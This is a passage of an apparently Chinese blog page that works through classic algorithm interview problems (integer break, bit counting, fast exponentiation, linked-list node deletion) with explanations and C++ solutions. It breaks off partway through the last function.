style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是最大乘积。</p><ol><li>显然1不会出现在其中；</li><li>如果对于某个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub><mo>≥</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">n_i\ge 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>那么把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">n_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 拆分成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>+</mo><mo stretchy="false">(</mo><msub><mi>n</mi><mi>i</mi></msub><mo>−</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">3+(n_i−3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>，我们有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo stretchy="false">(</mo><msub><mi>n</mi><mi>i</mi></msub><mo>−</mo><mn>3</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn><msub><mi>n</mi><mi>i</mi></msub><mo>−</mo><mn>9</mn><mo>&gt;</mo><msub><mi>n</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">3(n_i−3)=3n_i−9&gt;n_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7944em;vertical-align:-0.15em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>；</li><li>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">n_i=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>，拆成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2+2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>乘积不变，所以不妨假设没有4；</li><li>如果有三个以上的2，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>×</mo><mn>3</mn><mo>&gt;</mo><mn>2</mn><mo>×</mo><mn>2</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">3×3&gt;2×2×2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，所以替换成3乘积更大；</li></ol><p>综上，选用尽量多的3，直到剩下2或者4时，用2。</p><p>时间复杂度分析：当 n 比较大时，n 会被拆分成 ⌈n/3⌉ 个数，我们需要计算这么多次减法和乘法，所以时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> <span class="number">1</span> * (n - <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) res = <span class="number">4</span>, n -= <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">2</span>) res = <span class="number">2</span>, n -= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (n) res *= <span class="number">3</span>, n -= <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="二进制中1的个数"><a href="https://www.acwing.com/problem/content/25/">二进制中1的个数</a></h2><p>输入一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span> 位整数，输出该数二进制表示中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的个数。</p><p><strong>注意</strong>：</p><ul><li>负数在计算机中用其绝对值的补码来表示。</li></ul><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>100</mn><mo>≤</mo></mrow><annotation encoding="application/x-tex">-100 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">100</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span></span></span></span> 输入整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">\le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>样例1</strong></p><pre><code>输入：9输出：2解释：9的二进制表示是1001，一共有2个1。</code></pre><p><strong>样例2</strong></p><pre><code>输入：-2输出：31解释：-2在计算机里会被表示成11111111111111111111111111111110，      一共有31个1。</code></pre><h3 id="法1-转化为unsigned避免移位补符号数-O-logn">法1 转化为unsigned避免移位补符号数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p>需要转化为unsigned, 否则&gt;&gt;时会在左边填充符号位1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> un = n;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (un) &#123;</span><br><span class="line">      res += un &amp; <span class="number">1</span>;</span><br><span class="line">      un &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-使用lowbit-函数-O-logn">法2 使用lowbit()函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p>不用转化为unsigned, 即x &amp; -x求lowbit(x)对int x均成立</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">      n = n - (n &amp; -n);</span><br><span class="line">      res++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数值的整数次方★"><a href="https://www.acwing.com/problem/content/26/">数值的整数次方★</a></h2><p>实现函数_double Power(double base, int exponent)_，求_base_的 _exponent_次方。</p><p>不得使用库函数，同时不需要考虑大数问题。</p><p>只要输出结果与答案的绝对误差不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mn>2</mn></mrow></msup></mrow><annotation encoding="application/x-tex">10^{-2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> 即视为正确。</p><p><strong>注意：</strong></p><ul><li>不会出现底数和指数同为0的情况</li><li>当底数为0时，指数一定为正</li><li>底数的绝对值不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>，指数的绝对值不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>。</li></ul><p><strong>样例1</strong></p><pre><code>输入：10 ，2输出：100</code></pre><p><strong>样例2</strong></p><pre><code>输入：10 ，-2  输出：0.01</code></pre><h3 id="经典快速幂算法-O-logn">经典快速幂算法 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>需要转化为long long的原因: int的取值范围为[-2^31, 2^31-1], 而abs(-2^31)会溢出</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">double</span> <span class="title">Power</span><span class="params">(<span class="type">double</span> base, <span class="type">int</span> exponent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line">    <span class="type">double</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (LL k = <span class="built_in">abs</span>(<span class="built_in">LL</span>(exponent)); k; k &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (k &amp; <span class="number">1</span>) res *= base;</span><br><span class="line">      base *= base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (exponent &lt; <span class="number">0</span>) res = <span class="number">1</span> / res;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="在O-1-时间删除链表结点"><a href="https://www.acwing.com/problem/content/85/">在O(1)时间删除链表结点</a></h2><p>给定单向链表的一个节点指针，定义一个函数在O(1)时间删除该结点。</p><p>假设链表一定存在，并且该节点一定不是尾节点。</p><p><strong>数据范围</strong></p><p>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：链表 1-&gt;4-&gt;6-&gt;8      删掉节点：第2个节点即6（头节点为第0个节点）输出：新链表 1-&gt;4-&gt;8</code></pre><h3 id="替身-O-1">替身 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></h3><p>由于是单链表，我们不能找到前驱节点，所以我们不能按常规方法将该节点删除。<br>我们可以换一种思路，将下一个节点的值复制到当前节点，然后将下一个节点删除即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p = node-&gt;next;  <span class="comment">// 将下一节点的val和next赋值给本节点, 再删除下一节点</span></span><br><span class="line">        node-&gt;val = p-&gt;val;</span><br><span class="line">        node-&gt;next = p-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;  <span class="comment">// 防止内存泄露</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h2 id="删除链表中重复的节点"><a href="https://www.acwing.com/problem/content/27/">删除链表中重复的节点</a></h2><p>在一个排序的链表中，存在重复的节点，请删除该链表中重复的节点，重复的节点不保留。</p><p><strong>数据范围</strong></p><p>链表中节点 val 值取值范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。<br>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例1</strong></p><pre><code>输入：1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5输出：1-&gt;2-&gt;5</code></pre><p><strong>样例2</strong></p><pre><code>输入：1-&gt;1-&gt;1-&gt;2-&gt;3输出：2-&gt;3</code></pre><h3 id="题解-O-n-2">题解 O(n)</h3><p>把排序好的链表看成一段段的, 有长度为1的段, 也有长度&gt;=2的重复元素组成的段。<br>从前往后扫描整个链表，每次扫描元素相同的一段，如果这段中的元素个数多于1个，则将整段元素直接删除。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplication</span><span class="params">(ListNode* head)</span> 